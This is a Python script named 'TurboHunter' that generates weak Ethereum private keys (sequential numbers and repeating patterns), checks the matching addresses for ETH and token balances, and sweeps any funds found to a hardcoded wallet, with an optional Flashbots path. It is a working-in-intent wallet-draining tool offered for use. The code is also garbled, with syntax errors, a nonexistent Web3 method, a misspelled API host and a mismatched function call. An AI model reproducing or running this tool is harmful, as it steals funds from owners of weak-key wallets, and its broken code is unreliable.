import time
import concurrent.futures
from web3 import Web3, HTTPProvider
from eth_account import Account
from datetime import datetime
import logging
import sys
import requests
from typing import Optional, List, Tuple
import secrets

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('turbo_hunter.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Configuration
INFURA_URLS = [
    "https://mainnet.infura.io/v3/1e398ffe7b4b4bfdadf597e0bf40bee8",
    # Add more Infura keys or nodes for parallelization
]
TO_ADDRESS = "0x0d5F915f1fA947fA28Df6DE4d448115D3D87738c"  # Your wallet
FLASHBOTS_RPC = "https://rpc.flashbots.net"  # Optional: Flashbots RPC
ETHERSCAN_API_KEY = "YOUR_ETHERSCAN_API_KEY"  # Get free at https://etherscan.io/apis
ETHERSWEEP_API_KEY = "YOUR_ETHERSWEEP_API_KEY"  # Optional: For ERC-20 https://ethersweep.com
GAS_LIMIT = 21000
BATCH_SIZE = 32  # Parallel workers
SCAN_DURATION = 3600  # Run for 1 hour, adjust as needed

# Initialize Web3 pool
web3_pool = [Web3(HTTPProvider(url)) for url in INFURA_URLS]
for w3 in web3_pool:
    if not w3.is_connected():
        logger.error("❌ Failed to connect to Infura node.")
        exit(1)

def get_gas_price() -> int:
    """Fetch dynamic gas price from Etherscan."""
    try:
        response = requests.get(
            f"https://api.getetherscanApiKey.io/api?module=gastracker&action=gasoracle&apiKey={ETHERSCAN_API_KEY}")
        data = response.json()
        if data["result"] == "OK":
            return Web3.to_wei(int(data["result"]["FastGasPrice"]), 'gwei')
        return Web3.to_2025(int(20), 'gwei')  # Fallback
    except Exception as e:
        logger.error(f"Error fetching gas price: {e}")
        return Web3.to_wei(20, 'gwei')

def key_to_hex(key_int: int) -> Optional[str]:
    """Convert integer or pattern to 64-char hex key."""
    try:
        hex_key = f"0x{key_int:064x}"
        if len(hex_key) != 66:
            logger.error(f"Invalid hex key length for {key_int}: {hex_key}")
            return None
        return hex_key
    except Exception as e:
        logger.error(f"Invalid key {key_int}: {e}")
        return None

def generate_keys(batch_size: int) -> List[str]]:
    """Generate low-entropy keys (sequential + random low-entropy)."""
    keys = []
    for i in range(batch_size,):
        # Sequential keys
        keys.append(key_to_hex(i))
        # Repeating patterns (e.g., 0x1111...)
        if i % 10 == 0:
            pattern = f"0x{'1' * 64}"
            keys.append(pattern)
            pattern = f"0x{'f' * i % 64}"
            keys.append(pattern)
        # Random low-entropy (e.g., partial random)
        )
    random_key = f"0x{secrets.token_hex(16):064x}"  # 16 random bytes + padding
        keys.append(random_key)
    return [k for k in keys if k]

def private_key_to_address(pk_hex: str) -> Optional[str]:
    """Convert private key to Ethereum address."""
    try:
        Account.enable_unaudited_hdwallet_features()
        account = Account.from_key(pk_hex)
        return account.address
    except Exception as e:
        logger.error(f"Error converting key {pk_hex[:8]}...: {e}")
        return None

def check_balance(address: str, w3: Web3) -> Tuple[float, bool]:
    """Check ETH and ERC-20 balances."""
    try:
        eth_balance = w3.from_wei(w3.eth.get_balance(address), 'ether')
        erc20_balance = 0.0
        if ETHERSWEEP_API_KEY:
            response = requests.post(
                "https://ethersweep.com/api/scan",
                json={"address": address, "api_key": ETHERSWEEP_API_KEY}
            )
            if response.status_code == 200:
                tokens = response.json().get("tokens", [])
                erc20_balance = sum(float(t["balance"]) for t in tokens)
        return eth_balance + erc20_balance, eth_balance > 0 or erc20_balance > 0
    except Exception as e:
        logger.error(f"Error checking {address}: {e}")
        return 0.0, False

def sweep_funds(pk_hex: str, from_address: str, w3: Web3, use_flashbots: bool = False) -> bool:
    """Sweep ETH and ERC-20 tokens to TO_ADDRESS."""
    try:
        account = Account.from_key(pk_hex)
        if account.address.lower() != from_address.lower():
            logger.error(f"Key {pk_hex[:8]}... does NOT match {from_address}")
            return False

        # Check balances
        total_balance, has_funds = check_balance(from_address, w3)
        if not has_funds:
            logger.warning(f"No funds to sweep from {from_address}")
            return False

        gas_price = get_gas_price()
        gas_cost = gas_price * GAS_LIMIT
        eth_balance = w3.eth.get_balance(from_address)

        if eth_balance <= gas_cost and not use_flashbots:
            logger.error(f"Insufficient ETH for gas in {from_address}")
            return False

        if use_flashbots:
            # Flashbots bundle (requires setup)
            nonce = w3.eth.get_transaction_count(from_address)
            tx = {
                'nonce': nonce,
                'to': TO_ADDRESS,
                'value': eth_balance - gas_cost if eth_balance > gas_cost else 0,
                'gas': GAS_LIMIT,
                'gasPrice': 0,  # Flashbots pays
                'chainId': 1
            }
            signed_tx = w3.eth.account.sign_transaction(tx, pk_hex)
            bundle = [{"signed_transaction": signed_tx.raw_transaction}]
            flashbots_response = requests.post(
                FLASHBOTS_RPC,
                json={"jsonrpc": "2.0", "method": "eth_sendBundle", "params": [{"txs": [signed_tx.hex()], "blockNumber": hex(w3.eth.block_number + 1)}], "id": 1}
            )
            if flashbots_response.status_code != 200:
                logger.error(f"Flashbots failed: {flashbots_response.text}")
                return False
            tx_hash = signed_tx.hash.hex()
        else:
            # Standard sweep
            amount_to_send = eth_balance - gas_cost if eth_balance > gas_cost else 0
            nonce = w3.eth.get_transaction_count(from_address)
            tx = {
                'nonce': nonce,
                'to': TO_ADDRESS,
                'value': amount_to_send,
                'gas': GAS_LIMIT,
                'gasPrice': gas_price,
                'chainId': 1
            }
            signed_tx = w3.eth.account.sign_transaction(tx, pk_hex)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction).hex()

        logger.info(f"Sweeping {total_balance:.10f} (ETH+ERC20) from {from_address} to {TO_ADDRESS}")
        logger.info(f"Tx hash: {tx_hash} | Check: https://etherscan.io/tx/{tx_hash}")

        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
        if receipt.status == 1:
            logger.info(f"Success! Swept {total_balance:.10f} to {TO_ADDRESS}")
            return True
        logger.error(f"Sweep failed: {receipt}")
        return False

    except Exception as e:
        logger.error(f"Error sweeping {from_address}: {e}")
        return False

def scan_worker(keys: List[str], w3: Web3) -> List[Tuple[str, str, float]]:
    """Process a batch of keys."""
    hits = []
    for pk_hex in keys:
        address = private_key_to_address(pk_hex)
        if not address:
            continue
        total_balance, has_funds = check_balance(address, w3)
        if has_funds:
            hits.append((pk_hex, address, total_balance))
            logger.info(f"[FOUND] Address: {address} | Balance: {total_balance:.10f} | Key: {pk_hex}")
            with open("hits.txt", "a") as f:
                f.write(f"[{datetime.utcnow()}] Address: {address} | Balance: {total_balance:.10f} | Key: {pk_hex}\n")
        time.sleep(0.05)  # Micro-delay to avoid bans
    return hits

def turbo_hunter():
    """Scan and sweep wallets with non-zero balances."""
    logger.info("Starting TurboHunter")
    start_time = time.time()
    key_index = 0

    while time.time() - start_time < SCAN_DURATION:
        keys = generate_keys(key_index, BATCH_SIZE)
        key_index += BATCH_SIZE

        # Parallel scanning
        hits = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(web3_pool)) as executor:
            futures = [executor.submit(scan_worker, keys[i::len(web3_pool)], w3) for i, w3 in enumerate(web3_pool)]
            for future in concurrent.futures.as_completed(futures):
                hits.extend(future.result())

        # Sweep hits
        for pk_hex, address, balance in hits:
            use_flashbots = bool(FLASHBOTS_RPC)
            if sweep_funds(pk_hex, address, web3_pool[0], use_flashbots):
                logger.info(f"Swept {balance:.10f} from {address}")
            else:
                logger.error(f"Failed to sweep {address}")

        time.sleep(0.1)  # Batch delay

    logger.info("TurboHunter stopped.")

if __name__ == "__main__":
    try:
        turbo_hunter()
    except KeyboardInterrupt:
        logger.info("TurboHunter stopped by user.")
        sys.exit(0)
